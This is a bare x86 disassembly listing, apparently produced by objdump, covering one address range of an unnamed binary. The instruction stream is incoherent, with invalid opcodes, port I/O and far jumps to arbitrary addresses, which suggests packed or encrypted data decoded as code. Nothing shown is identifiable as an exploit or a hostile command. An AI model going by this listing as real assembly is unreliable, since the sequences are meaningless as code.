  41e7ad:	fistp  DWORD PTR [edx+0x3ab910ab]
  41e7b3:	fidivr DWORD PTR [ebx+eiz*1+0x70]
  41e7b7:	sti    
  41e7b8:	adc    eax,0x54db003c
  41e7bd:	sub    eax,DWORD PTR [edx-0x6a]
  41e7c0:	jmp    0x41e794
  41e7c2:	outs   dx,BYTE PTR ds:[esi]
  41e7c3:	out    0x5a,eax
  41e7c5:	sub    al,0xcb
  41e7c7:	fldenv [ecx+0x23]
  41e7ca:	fs es leave 
  41e7cd:	jmp    0xe740e2a3
  41e7d2:	(bad)
  41e7d5:	jb     0x41e82f
  41e7d7:	clc    
  41e7d8:	xlat   BYTE PTR ds:[ebx]
  41e7d9:	test   eax,0xf7678b6d
  41e7de:	mov    eax,0xb4d00183
  41e7e3:	dec    edx
  41e7e4:	(bad)  [ebx+ebp*8+0x77b38676]
  41e7eb:	cs cdq 
  41e7ed:	imul   edx,DWORD PTR [ecx-0x2f62ee5d],0xffffffde
  41e7f4:	daa    
  41e7f5:	inc    edi
  41e7f6:	and    BYTE PTR [edi+ebx*4-0xe],bh
  41e7fa:	inc    ebx
  41e7fb:	inc    edi
  41e7fc:	jmp    0xd882:0x39be34d6
  41e803:	out    0x80,al
  41e805:	jle    0x41e79e
  41e807:	add    ah,BYTE PTR [edx]
  41e809:	int3   
  41e80a:	jb     0x41e7f1
  41e80c:	cmp    ebp,eax
  41e80e:	xor    BYTE PTR [ecx+edi*4],0x3d
  41e812:	retf   
  41e813:	loope  0x41e850
  41e815:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e816:	jae    0x41e82a
  41e818:	mov    ecx,edi
  41e81a:	jo     0x41e831
  41e81c:	inc    ebp
  41e81d:	push   esi
  41e81e:	call   0x6988:0x899d4907
  41e825:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e826:	loopne 0x41e86e
  41e828:	jle    0x41e7e9
  41e82a:	dec    edi
  41e82b:	jp     0x41e8a6
  41e82d:	adc    eax,DWORD PTR ds:0x23f24334
  41e833:	popa   
  41e834:	fst    DWORD PTR [eax-0x7a]
  41e837:	outs   dx,DWORD PTR ds:[esi]
  41e838:	ds es mov sp,0x79c6
  41e83e:	add    ah,ah
  41e840:	add    ebp,DWORD PTR [ecx-0x3d]
  41e843:	hlt    
  41e844:	imul   ebx,DWORD PTR [edi+0xd],0x4373907a
  41e84b:	push   edi
  41e84c:	call   0xa9f0:0xf6d3b5b
  41e853:	jo     0x41e857
  41e855:	stos   DWORD PTR es:[edi],eax
  41e856:	push   eax
  41e857:	inc    ecx
  41e858:	jae    0x41e8b7
  41e85a:	push   0x46122a9c
  41e85f:	ror    BYTE PTR [edi],1
  41e861:	je     0x41e841
  41e863:	mov    al,ds:0x7e51aa0f
  41e868:	dec    edx
  41e869:	or     eax,0xe994672e
  41e86e:	mov    ebx,0x6027c694
  41e873:	int    0x42
  41e875:	div    BYTE PTR [ebp+0x41]
  41e878:	dec    edx
  41e879:	xor    BYTE PTR [ecx],bh
  41e87b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e87c:	jns    0x41e8db
  41e87e:	imul   DWORD PTR [edi+0x6e20b295]
  41e884:	xchg   esi,eax
  41e885:	adc    al,0xb2
  41e887:	out    0x1d,eax
  41e889:	call   DWORD PTR [edi+0x55dae5e8]
  41e88f:	dec    eax
  41e890:	out    0x9a,eax
  41e892:	int3   
  41e893:	fbld   TBYTE PTR [esi+0x77]
  41e896:	xor    ebp,DWORD PTR [edx]
  41e898:	sbb    dh,cl
  41e89a:	jb     0x41e8b2
  41e89c:	test   BYTE PTR [esi+ebp*2-0x4d],bl
  41e8a0:	sbb    DWORD PTR [edx+0x2],edi
  41e8a3:	jns    0x41e865
  41e8a5:	lods   eax,DWORD PTR ds:[esi]
  41e8a6:	and    DWORD PTR [eax+0x77],esi
  41e8a9:	in     eax,0xaa
  41e8ab:	into   
  41e8ac:	outs   dx,DWORD PTR gs:[esi]
  41e8ae:	cmp    edi,DWORD PTR [eax]
  41e8b0:	push   ebp
  41e8b1:	add    eax,0xdd22e3a5
  41e8b6:	adc    al,0x4f
  41e8b8:	stos   DWORD PTR es:[edi],eax
  41e8b9:	cmp    esp,DWORD PTR ds:[edx+0x6f]
  41e8bd:	mov    ecx,0x4cb04657
  41e8c2:	sahf   
  41e8c3:	js     0x41e8b2
  41e8c5:	in     eax,dx
  41e8c6:	cli    
  41e8c7:	lods   al,BYTE PTR ds:[esi]
  41e8c8:	int3   
  41e8c9:	jl     0x41e8dc
  41e8cb:	jle    0x41e895
  41e8cd:	das    
  41e8ce:	rol    DWORD PTR ds:0xffb3479e,1
  41e8d4:	mov    ebp,0xb2972dfc
  41e8d9:	push   eax
  41e8da:	add    DWORD PTR [esi-0x20],edi
  41e8dd:	pop    ecx
  41e8de:	jecxz  0x41e887
  41e8e0:	dec    edx
  41e8e1:	add    DWORD PTR [esp+edi*2-0x51],edi
  41e8e5:	add    BYTE PTR [edi-0x5c779128],al
  41e8eb:	stos   DWORD PTR es:[edi],eax
  41e8ec:	ins    BYTE PTR es:[edi],dx
  41e8ed:	xlat   BYTE PTR ds:[ebx]
  41e8ee:	xor    esp,DWORD PTR [ebp-0x50436da7]
  41e8f4:	pop    ds
  41e8f5:	mov    ebp,0x76444e53
  41e8fa:	fsubr  st(1),st
  41e8fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8fd:	mov    esp,0x55bdd9d1
  41e902:	push   edx
  41e903:	stc    
  41e904:	leave  
  41e905:	push   es
  41e906:	ja     0x41e8ea
  41e908:	sti    
  41e909:	mov    dh,0xc3
  41e90b:	mov    ebp,0x9efd31a2
  41e910:	or     DWORD PTR [ecx*4+0x7ed401c0],edx
  41e917:	sub    eax,0x7071e528
  41e91c:	lods   eax,DWORD PTR ds:[esi]
  41e91d:	out    0xf4,eax
  41e91f:	inc    ax
  41e921:	ror    DWORD PTR [ebx-0x21c85280],cl
  41e927:	pop    eax
  41e928:	fwait
  41e929:	popf   
  41e92a:	ss js  0x41e8d6
  41e92d:	lahf   
  41e92e:	and    eax,0xdca5cb02
  41e933:	adc    eax,0xfd2011c9
  41e938:	jnp    0x41e93d
  41e93a:	xor    al,BYTE PTR [edx+0x0]
  41e93d:	ins    DWORD PTR es:[edi],dx
  41e93e:	dec    eax
  41e93f:	xchg   esi,eax
  41e940:	pop    edx
  41e941:	mov    bl,al
  41e943:	rcl    DWORD PTR [edx+edi*1+0x28],cl
  41e947:	xor    al,dh
  41e949:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e94a:	mov    ss,WORD PTR [ebp-0x779d8b9e]
  41e950:	std    
  41e951:	jb     0x41e98f
  41e953:	ret    0xc9db
  41e956:	icebp  
  41e957:	mov    dh,0x8
  41e959:	and    eax,0x158efb6f
  41e95e:	mov    eax,ds:0xc07097ab
  41e963:	dec    esp
  41e964:	and    edx,esi
  41e966:	aas    
  41e967:	mov    dl,0x23
  41e969:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e96a:	data16 mov ch,0xb2
  41e96d:	xchg   ecx,eax
  41e96e:	sub    DWORD PTR [ecx-0x47],ecx
  41e971:	and    ch,dh
  41e973:	aad    0xca
  41e975:	in     eax,dx
  41e976:	push   0x1f
  41e978:	adc    al,0x39
  41e97a:	mov    al,ds:0x7839dc4b
  41e97f:	test   al,0x88
  41e981:	jle    0x41e93c
  41e983:	jmp    0x4343:0xf6ef8fa9
  41e98a:	imul   eax,ebp,0x5dbfe8f5
  41e990:	les    edx,FWORD PTR [edx+0x19]
  41e993:	aam    0xe9
  41e995:	dec    eax
  41e996:	and    al,0x9
  41e998:	cdq    
  41e999:	xchg   edx,eax
  41e99a:	sub    ah,BYTE PTR [ebx+0x474471de]
  41e9a0:	loope  0x41e97c
  41e9a2:	sub    ch,BYTE PTR [ecx-0x2aa175c1]
  41e9a8:	out    dx,eax
  41e9a9:	jbe    0x41e9df
  41e9ab:	aam    0x88
  41e9ad:	mov    cl,0x55
  41e9af:	mov    DWORD PTR ds:0x8e4adf86,ecx
  41e9b5:	lea    ebp,[ecx+0x2ac9ea18]
  41e9bb:	mov    bl,0x6a
  41e9bd:	je     0x41e9d6
  41e9bf:	xor    al,0x6c
  41e9c1:	stos   BYTE PTR es:[edi],al
  41e9c2:	fdiv   QWORD PTR fs:[edi+0x7df599aa]
  41e9c9:	mov    esi,0xb4000905
  41e9ce:	jmp    0x41e9c0
  41e9d0:	nop
  41e9d1:	(bad)  
  41e9d2:	(bad)
  41e9d6:	dec    esp
  41e9d7:	pop    ecx
  41e9d8:	sub    eax,0x81537251
  41e9dd:	xchg   bl,dl
  41e9df:	addr16 ds add al,0xfb
  41e9e3:	mov    cl,BYTE PTR [ecx]
  41e9e5:	call   0x477a00c7
  41e9ea:	mov    al,ds:0x852ccdf1
  41e9ef:	mov    esi,0x258fda1
  41e9f4:	cmp    BYTE PTR [edx],0xc6
  41e9f7:	pop    edx
  41e9f8:	aas    
  41e9f9:	jae    0x41ea4a
  41e9fb:	mov    edi,0xafde7d42
  41ea00:	push   ebp
  41ea01:	cmp    eax,0xcb3f0a02
  41ea06:	cmp    eax,0xb227ec05
  41ea0b:	(bad)  
  41ea0c:	lahf   
  41ea0d:	outs   dx,DWORD PTR ds:[esi]
  41ea0e:	xchg   ebp,eax
  41ea0f:	mov    esi,0x44753470
  41ea14:	mov    ah,0x29
  41ea16:	xor    BYTE PTR [ebp+0x41],dh
  41ea19:	fisttp DWORD PTR [edi+0x5]
  41ea1c:	dec    ebp
  41ea1d:	mov    ebx,0xab1148ad
  41ea22:	add    ah,al
  41ea24:	mov    bl,0xd2
  41ea26:	lock fcmove st,st(7)
  41ea29:	cli    
  41ea2a:	out    0x11,eax
  41ea2c:	dec    edi
  41ea2d:	mov    eax,0xcecc146f
  41ea32:	cmp    DWORD PTR [edi],esp
  41ea34:	mov    bh,0xae
  41ea36:	mov    dh,0xad
  41ea38:	out    dx,al
  41ea39:	jp     0x41ea95
  41ea3b:	push   ebp
  41ea3c:	mov    al,0x98
  41ea3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea3f:	add    eax,0xccd66b7b
  41ea44:	adc    DWORD PTR [edx+0x2b7d53d2],edx
  41ea4a:	adc    DWORD PTR [ebx+eax*8-0x30],ebx
  41ea4e:	mov    ebp,0xef08ee8a
  41ea53:	inc    ecx
  41ea54:	mov    WORD PTR [ebp+0x13],es
  41ea57:	repz rol BYTE PTR [esi-0x5375636e],1
  41ea5e:	dec    esp
  41ea5f:	or     ah,dl
  41ea61:	nop
  41ea62:	pop    eax
  41ea63:	and    al,0x43
  41ea65:	cmp    esp,DWORD PTR [edi+0x79cc0fb5]
  41ea6b:	int3   
  41ea6c:	(bad)  
  41ea6e:	cmp    eax,ebx
  41ea70:	jg     0x41ea83
  41ea72:	aam    0x38
  41ea74:	jp     0x41eab7
  41ea76:	jno    0x41eaea
  41ea78:	sbb    esi,0x45920926
  41ea7e:	je     0x41eac2
  41ea80:	je     0x41eae3
  41ea82:	mov    bh,0xcf
  41ea84:	mov    bh,0x3c
  41ea86:	pop    es
  41ea87:	xchg   edx,eax
  41ea88:	jg     0x41ea52
  41ea8a:	sub    ebp,DWORD PTR [edx-0x29]
  41ea8d:	inc    esi
  41ea8e:	ret    
  41ea8f:	or     al,BYTE PTR [edx-0x55]
  41ea92:	dec    ebx
  41ea93:	add    BYTE PTR [edi+0x7eedfd96],al
  41ea99:	cmp    bh,BYTE PTR [ebx-0x126418e5]
  41ea9f:	stos   DWORD PTR es:[edi],eax
  41eaa0:	sahf   
  41eaa1:	inc    ebp
  41eaa2:	add    DWORD PTR [eax+0x14],edi
  41eaa5:	xchg   ebx,eax
  41eaa6:	mov    dh,0xea
  41eaa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eaa9:	pop    edx
  41eaaa:	ss jo  0x41ea91
  41eaad:	lods   eax,DWORD PTR ds:[esi]
  41eaae:	sbb    esi,DWORD PTR [ecx+0x24846420]
  41eab4:	pop    es
  41eab5:	push   ecx
  41eab6:	call   0x6595:0x7c1cf85c
  41eabd:	scas   eax,DWORD PTR es:[edi]
  41eabe:	gs jmp 0xdbc7de2c
  41eac4:	xchg   ecx,eax
  41eac5:	xlat   BYTE PTR ds:[bx]
  41eac7:	mov    dl,0xcf
  41eac9:	dec    ebp
  41eaca:	or     ch,BYTE PTR [ebx]
  41eacc:	pop    es
  41eacd:	add    edi,DWORD PTR ds:[edx]
  41ead0:	retf   0x2095
  41ead3:	xor    esp,DWORD PTR [ebx+0x57]
  41ead6:	fld    QWORD PTR [eax]
  41ead8:	mov    bl,0x81
  41eada:	mov    esp,0xd378ac7
  41eadf:	pop    es
  41eae0:	mov    ebp,0x2bfa5db6
  41eae5:	fisub  WORD PTR [esi]
  41eae7:	jge    0x41eabb
  41eae9:	inc    edi
  41eaea:	(bad)  
  41eaeb:	in     al,dx
  41eaec:	lea    edi,[bx+0x58]
  41eaf0:	je     0x41eb1c
  41eaf2:	dec    ebp
  41eaf3:	repz inc edx
  41eaf5:	dec    eax
  41eaf6:	inc    ecx
  41eaf7:	neg    eax
  41eaf9:	xchg   ebx,eax
  41eafa:	fwait
  41eafb:	mov    ds:0x1d63e865,al
  41eb00:	sub    DWORD PTR [ebp-0x654bca79],ebp
  41eb06:	icebp  
  41eb07:	push   0x16
  41eb09:	jle    0x41eb4e
  41eb0b:	sub    BYTE PTR [edi+0x65e76a81],0xed
  41eb12:	push   ebx
  41eb13:	test   al,0x33
  41eb15:	sahf   
  41eb16:	retf   
  41eb17:	dec    BYTE PTR [eax]
  41eb19:	sbb    eax,0x86c69f62
  41eb1e:	jmp    0x80ade86b
  41eb23:	or     al,BYTE PTR [ecx+0x70823585]
  41eb29:	ss pusha 
  41eb2b:	xchg   ebx,eax
  41eb2c:	pop    ss
  41eb2d:	retf   
  41eb2e:	inc    ebx
  41eb2f:	pop    ecx
  41eb30:	je     0x41eb78
  41eb32:	adc    ecx,0xffffffe1
  41eb35:	sbb    eax,DWORD PTR [esi]
  41eb37:	mov    dl,0xf9
  41eb39:	loop   0x41eb37
  41eb3b:	les    ecx,FWORD PTR [edi-0x4710bb4b]
  41eb41:	push   edi
  41eb42:	xchg   edx,eax
  41eb43:	(bad)  
  41eb44:	es cmp eax,0x5eb28119
  41eb4a:	(bad)  
  41eb4b:	mov    ?,WORD PTR [eax-0x2]
  41eb4e:	(bad)  
  41eb50:	jmp    0xa7e0778
  41eb55:	aad    0x1f
  41eb57:	push   esi
  41eb58:	bound  esi,QWORD PTR [ebx]
  41eb5a:	xor    al,0xde
  41eb5c:	(bad)  
  41eb5d:	in     eax,0x50
  41eb5f:	jne    0x41eb48
  41eb61:	jmp    0x41ebcf
  41eb63:	mov    cl,0xf3
  41eb65:	out    0xa1,eax
  41eb67:	xor    eax,0xfaf6a384
  41eb6c:	hlt    
  41eb6d:	js     0x41ebac
  41eb6f:	jp     0x41eb2b
  41eb71:	and    eax,DWORD PTR [edx-0x9]
  41eb74:	rcr    DWORD PTR [ecx],cl
  41eb76:	aaa    
  41eb77:	hlt    
  41eb78:	je     0x41eb5a
  41eb7a:	xchg   DWORD PTR [edx-0xd],ebp
  41eb7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb7e:	stos   BYTE PTR es:[edi],al
  41eb7f:	imul   esp,DWORD PTR [ebp+0x13],0xffffffb3
  41eb83:	pop    ebx
  41eb84:	icebp  
  41eb85:	cmp    edx,DWORD PTR [ecx-0x26d9c8a5]
  41eb8b:	cdq    
  41eb8c:	fst    QWORD PTR [ecx]
  41eb8e:	sbb    DWORD PTR ss:[ebp+0x671b8b93],esi
  41eb95:	cs or  esp,esp
  41eb98:	mov    BYTE PTR [edi-0x373b3f5c],cl
  41eb9e:	mov    eax,0xe6fd383a
  41eba3:	cmc    
  41eba4:	jg     0x41eb5c
  41eba6:	sub    edx,DWORD PTR [ebx-0x26]
  41eba9:	stos   BYTE PTR es:[edi],al
  41ebaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebab:	sbb    BYTE PTR [esi-0x6b78300e],dl
  41ebb1:	and    DWORD PTR [esi-0x57],0xffffffd6
  41ebb5:	xor    eax,0x7fc74016
  41ebba:	sub    BYTE PTR [ecx],0xd5
  41ebbd:	addr16 mov eax,0xe2886d15
  41ebc3:	dec    eax
  41ebc4:	clc    
  41ebc5:	es daa 
  41ebc7:	aas    
  41ebc8:	xor    eax,0x30097159
  41ebcd:	in     eax,0x63
  41ebcf:	mov    ebp,0x19b81d93
  41ebd4:	mov    DWORD PTR ds:0x162aaeba,0xfb270b3f
  41ebde:	xchg   ecx,eax
  41ebdf:	xchg   ecx,eax
  41ebe0:	and    eax,0xda459e61
  41ebe5:	iret   
  41ebe6:	mov    ah,0x53
  41ebe8:	xor    dl,BYTE PTR [edi+ebx*8]
  41ebeb:	icebp  
  41ebec:	stos   BYTE PTR es:[edi],al
  41ebed:	inc    ebp
  41ebee:	pop    esp
  41ebef:	jmp    0x81c5:0x26055acb
  41ebf6:	cld    
  41ebf7:	and    ch,cl
  41ebf9:	stos   BYTE PTR es:[edi],al
  41ebfa:	test   BYTE PTR [edi+ecx*1-0xc],ah
  41ebfe:	(bad)  
  41ebff:	mov    dl,0xbb
  41ec01:	ins    BYTE PTR es:[edi],dx
  41ec02:	and    DWORD PTR [ebx+0x2],esi
  41ec05:	loopne 0x41ec58
  41ec07:	mov    ds:0x26db0421,al
  41ec0c:	fucomp st(0)
  41ec0e:	std    
  41ec0f:	sub    DWORD PTR [ecx-0x2b],edi
  41ec12:	outs   dx,BYTE PTR ds:[esi]
  41ec13:	les    ecx,FWORD PTR [ebx-0x4]
  41ec16:	or     DWORD PTR [eax+0x558f549f],eax
  41ec1c:	retf   
  41ec1d:	sti    
  41ec1e:	retf   
  41ec1f:	loop   0x41ec38
  41ec21:	call   0xc4f8cbed
  41ec26:	repnz rcr BYTE PTR [esp+ecx*1+0x6f],cl
  41ec2b:	jno    0x41ec98
  41ec2d:	mov    edx,0xe9b1b583
  41ec32:	dec    edx
  41ec33:	cmp    eax,0x24f95ae2
  41ec38:	cmp    BYTE PTR [edi],cl
  41ec3a:	sbb    edx,0x5fe548df
  41ec40:	lds    edi,FWORD PTR [esi-0x4855f01a]
  41ec46:	adc    dh,bh
  41ec48:	mov    esp,0xecb9f7f1
  41ec4d:	and    ebx,DWORD PTR [eax+0x6a6f6d2a]
  41ec53:	jae    0x41ec9d
  41ec55:	mov    ds:0x39780e3f,eax
  41ec5a:	mov    al,0x70
  41ec5c:	add    al,0xe0
  41ec5e:	push   ebp
  41ec5f:	ss sbb al,0x41
  41ec62:	fisubr DWORD PTR [esi+0x2d]
  41ec65:	and    al,0x3c
  41ec67:	mov    ch,0xc6
  41ec69:	outs   dx,DWORD PTR ds:[esi]
  41ec6a:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41ec6c:	xchg   ebx,eax
  41ec6d:	pop    eax
  41ec6e:	mov    esi,0x1d153926
  41ec73:	ss lock inc edi
  41ec76:	push   es
  41ec77:	loop   0x41ec29
  41ec79:	fisttp WORD PTR [esi+0xaa980f6]
  41ec7f:	inc    ebx
  41ec80:	inc    edi
  41ec81:	push   edx
  41ec82:	jmp    0x41ec5c
  41ec84:	je     0x41ecbe
  41ec86:	mov    eax,DWORD PTR [edi]
  41ec88:	inc    edx
  41ec89:	fcomp  QWORD PTR [edx+ecx*8-0x38117d5c]
  41ec90:	jo     0x41eca0
  41ec92:	popf   
  41ec93:	push   ebx
  41ec94:	lds    ebx,FWORD PTR [ecx]
  41ec96:	push   es
  41ec97:	shl    BYTE PTR [edx+0x4c],cl
  41ec9a:	inc    edi
  41ec9b:	dec    edi
  41ec9c:	jl     0x41ecf3
  41ec9e:	mov    ds:0x8ed8f27e,eax
  41eca3:	nop
  41eca4:	add    eax,0x277c61a0
  41eca9:	dec    ebp
  41ecaa:	mov    WORD PTR [ebx],cs
  41ecac:	adc    ah,BYTE PTR [eax+edx*2+0x1a3272b1]
  41ecb3:	ror    BYTE PTR [ebx-0x27],cl
  41ecb6:	fild   WORD PTR [ecx-0x2b]
  41ecb9:	popa   
  41ecba:	test   DWORD PTR [edi+0x6325dc11],esi
  41ecc0:	add    eax,0x83b1b2d0
  41ecc5:	out    dx,al
  41ecc6:	das    
  41ecc7:	daa    
  41ecc8:	add    al,0x7f
  41ecca:	das    
  41eccb:	jl     0x41ed3d
  41eccd:	xor    al,0xe0
  41eccf:	or     eax,0xed53bb69
  41ecd4:	das    
  41ecd5:	call   0x315defca
  41ecda:	cmp    ah,BYTE PTR [ebp-0x53]
  41ecdd:	sub    ebp,ebx
  41ecdf:	jb     0x41ed5b
  41ece1:	int    0x96
  41ece3:	data16 ss jle 0x41ed57
  41ece7:	mov    al,ds:0xe075621c
  41ecec:	add    DWORD PTR [ebx],edi
  41ecee:	mov    WORD PTR [esi+0x34c92a65],ds
  41ecf4:	leave  
  41ecf5:	(bad)
  41ecf8:	add    DWORD PTR [eax-0x2128b8f],esi
  41ecfe:	shl    BYTE PTR [ecx],0x0
  41ed01:	add    ebp,DWORD PTR [esi+eiz*4-0x622d3698]
  41ed08:	dec    edi
  41ed09:	jnp    0x41ed22
  41ed0b:	cwde   
  41ed0c:	mov    dl,0xa3
  41ed0e:	inc    ebp
  41ed0f:	xchg   ebp,eax
  41ed10:	sub    eax,0x1959dff2
  41ed15:	inc    ebx
  41ed16:	sbb    al,0x1e
  41ed18:	pop    esp
  41ed19:	inc    ecx
  41ed1a:	mov    ecx,0x562455f7
  41ed1f:	add    al,0x47
  41ed21:	jmp    0xfc1e:0x6b3ef5b0
  41ed28:	mov    BYTE PTR ds:0xfe678339,cl
  41ed2e:	push   eax
  41ed2f:	pop    edx
  41ed30:	dec    sp
  41ed32:	stc    
  41ed33:	push   esi
  41ed34:	ficomp WORD PTR [edx+0xc]
  41ed37:	dec    edx
  41ed38:	pop    esi
  41ed39:	lds    edi,FWORD PTR [ecx]
  41ed3b:	inc    ebx
  41ed3c:	push   esp
  41ed3d:	mov    edx,0x4e3a3bbc
  41ed42:	mov    ch,0x6
  41ed44:	rcr    BYTE PTR [ebx],1
  41ed46:	inc    esp
  41ed47:	addr16 jns 0x41ed54
  41ed4a:	inc    edx
  41ed4b:	jns    0x41ed19
  41ed4d:	or     ah,BYTE PTR [esi]
  41ed4f:	repz or BYTE PTR [ecx+0x20ad0b8c],cl
  41ed56:	or     edi,ebp
  41ed58:	adc    esi,DWORD PTR ds:0x2d7ed6d6
  41ed5e:	in     al,0xa0
  41ed60:	in     eax,dx
  41ed61:	leave  
  41ed62:	leave  
  41ed63:	cwde   
  41ed64:	scas   eax,DWORD PTR es:[edi]
  41ed65:	mov    WORD PTR [edx+eax*2+0x3df20334],?
  41ed6c:	imul   BYTE PTR [esi]
  41ed6e:	mov    DWORD PTR [ecx],ebx
  41ed70:	sub    ch,BYTE PTR [edx]
  41ed72:	lahf   
  41ed73:	ficom  WORD PTR [ebp+0xb]
  41ed77:	pop    ebp
  41ed78:	xchg   esp,eax
  41ed79:	push   es
  41ed7a:	sub    BYTE PTR [ecx+0x14],al
  41ed7d:	into   
  41ed7e:	aaa    
  41ed7f:	cmp    bl,BYTE PTR [ebx+0x48b94035]
  41ed85:	push   es
  41ed86:	mov    cl,0xc1
  41ed88:	sub    ah,ch
  41ed8a:	jae    0x41ee04
  41ed8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed8d:	sbb    dh,dl
  41ed8f:	push   cs
  41ed90:	mov    ebx,0x79c799b4
  41ed95:	paddb  mm5,QWORD PTR [eax-0x25]
  41ed99:	jmp    0x7fa1ec7d
  41ed9e:	mov    edi,0x464787c3
  41eda3:	adc    BYTE PTR [ebp-0x7426e2e9],al
  41eda9:	jnp    0x41ede5
  41edab:	hlt    
  41edac:	mov    ebp,ebx
  41edae:	xchg   edx,eax
  41edaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edb0:	sbb    ch,BYTE PTR [eax+ebx*1]
  41edb3:	pop    ds
  41edb4:	in     al,dx
  41edb5:	adc    DWORD PTR [ebx-0x59],0x26
  41edb9:	sub    BYTE PTR [edx+0x7fa345ea],0x2e
  41edc0:	add    eax,0xe6d3d3d4
  41edc5:	dec    edx
  41edc6:	xchg   ecx,eax
  41edc7:	pop    edi
  41edc8:	(bad)  
  41edc9:	fisubr DWORD PTR [ebp-0x36a9c5e0]
  41edcf:	mov    WORD PTR [ecx+0xc4de51b],cs
  41edd5:	fdiv   st,st(4)
  41edd7:	out    0x3,eax
  41edd9:	gs cli 
  41eddb:	fild   DWORD PTR [esi-0x75]
  41edde:	(bad)  
  41eddf:	in     eax,dx
  41ede0:	inc    edi
  41ede1:	push   cs
  41ede2:	test   eax,0xcc26e3ac
  41ede8:	pushf  
  41ede9:	xchg   edx,eax
  41edea:	push   ds
  41edeb:	stos   BYTE PTR es:[edi],al
  41edec:	sub    edx,edi
  41edee:	inc    eax
  41edef:	pop    esp
  41edf0:	jp     0xb722c045
  41edf6:	pop    edi
  41edf7:	and    BYTE PTR ds:0x6ba321a4,bh
  41edfd:	pop    es
  41edfe:	aas    
  41edff:	jae    0x41ee76
  41ee01:	lods   eax,DWORD PTR ds:[esi]
  41ee02:	imul   edi,DWORD PTR [ebx],0xc1c3eb7e
  41ee08:	mov    cl,0xe2
  41ee0a:	(bad)  
  41ee0b:	pop    ecx
  41ee0c:	rcr    BYTE PTR [edi+0x201c91b8],0x15
  41ee13:	mov    ecx,DWORD PTR [ebx+edx*8+0x2f6c22c6]
  41ee1a:	sub    edx,edi
  41ee1c:	in     eax,dx
  41ee1d:	dec    edi
  41ee1e:	adc    al,BYTE PTR [edi]
  41ee20:	inc    ebp
  41ee21:	pop    ss
  41ee22:	mov    esi,0xb7905616
  41ee27:	or     ebp,edi
  41ee29:	inc    ebp
  41ee2a:	add    BYTE PTR [ebp-0x687523bc],dh
  41ee30:	sub    bl,bl
  41ee32:	out    0xde,eax
  41ee34:	in     al,0x16
  41ee36:	pop    eax
  41ee37:	adc    DWORD PTR [edx+0x5621d7af],eax
  41ee3d:	and    BYTE PTR [edi],bl
  41ee3f:	rcl    DWORD PTR [ebx],cl
  41ee41:	add    DWORD PTR [ebx-0x1b],0x59
  41ee45:	js     0x41ee24
  41ee47:	ja     0x41ee32
  41ee49:	xchg   edi,eax
  41ee4a:	push   edx
  41ee4b:	adc    BYTE PTR [eax-0xe90a1c0],bh
  41ee51:	or     dh,BYTE PTR [ebx+0x26]
  41ee54:	int3   
  41ee55:	inc    ebp
  41ee56:	pop    ebx
  41ee57:	shr    BYTE PTR ds:0x1f93fdb8,0x41
  41ee5e:	sbb    DWORD PTR [eax],0x65f4d9e8
  41ee64:	inc    ebx
  41ee65:	xlat   BYTE PTR ds:[ebx]
  41ee66:	in     al,0xb4
  41ee68:	lds    ebx,FWORD PTR [edi+ebx*1-0x1e]
  41ee6c:	rcr    ah,1
  41ee6e:	cld    
  41ee6f:	jb     0x41ee79
  41ee71:	cmp    BYTE PTR [esi],bh
  41ee73:	inc    ebx
  41ee74:	push   edx
  41ee75:	mov    BYTE PTR [esi+0x14],al
  41ee78:	fisttp DWORD PTR [ebp+0x11]
  41ee7b:	push   esp
  41ee7c:	aad    0x36
  41ee7e:	lahf   
  41ee7f:	mov    dh,0x63
  41ee81:	inc    eax
  41ee82:	sub    esi,edi
  41ee84:	or     BYTE PTR [ebp+edi*4+0x6af507fa],ch
  41ee8b:	clc    
  41ee8c:	jns    0x41eeca
  41ee8e:	jns    0x41ee30
  41ee90:	inc    ecx
  41ee91:	mov    bl,0x3d
  41ee93:	push   edi
  41ee94:	adc    al,0x80
  41ee96:	out    dx,al
  41ee97:	lahf   
  41ee98:	mov    bh,0x7
  41ee9a:	xchg   DWORD PTR cs:[eax],ebx
  41ee9d:	xor    BYTE PTR ds:0x767bec51,cl
  41eea3:	xchg   esp,eax
  41eea4:	sbb    ah,BYTE PTR [ecx-0x29]
  41eea7:	pushf  
  41eea8:	mov    cl,0x1a
  41eeaa:	or     DWORD PTR [edx-0x7bece9f9],edi
  41eeb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eeb1:	scas   eax,DWORD PTR es:[edi]
  41eeb2:	fcomp  QWORD PTR [edx]
  41eeb4:	push   edx
  41eeb5:	mov    esi,0xcb94b9e
  41eeba:	in     eax,0x83
  41eebc:	xchg   ecx,eax
  41eebd:	enter  0xb9f7,0x74
  41eec1:	sub    BYTE PTR es:[edi+ecx*4+0x61],bl
  41eec6:	ss arpl bx,sp
  41eec9:	xchg   ebp,eax
  41eeca:	ret    0xb861
  41eecd:	or     bl,BYTE PTR [ecx-0x3a]
  41eed0:	jae    0x41ef50
  41eed2:	ds jmp 0x895a:0x117972ea
  41eeda:	aaa    
  41eedb:	jle    0x41ee80
  41eedd:	inc    ecx
  41eede:	fst    DWORD PTR [ebx+0x6228b789]
  41eee4:	test   eax,0x8beaca44
  41eee9:	es test al,0x95
  41eeec:	gs push ebx
  41eeee:	jecxz  0x41ef22
  41eef0:	xchg   ecx,eax
  41eef1:	mul    bl
  41eef3:	pushf  
  41eef4:	xor    BYTE PTR [ebx-0x76],ch
  41eef7:	pop    ecx
  41eef8:	neg    BYTE PTR [ecx]
  41eefa:	lods   al,BYTE PTR ds:[esi]
  41eefb:	shr    DWORD PTR [edx],cl
  41eefd:	mov    ds:0xb0f9dfc4,al
  41ef02:	mov    ch,0xdf
  41ef04:	adc    ebp,DWORD PTR [edx+0x1c]
  41ef07:	push   ecx
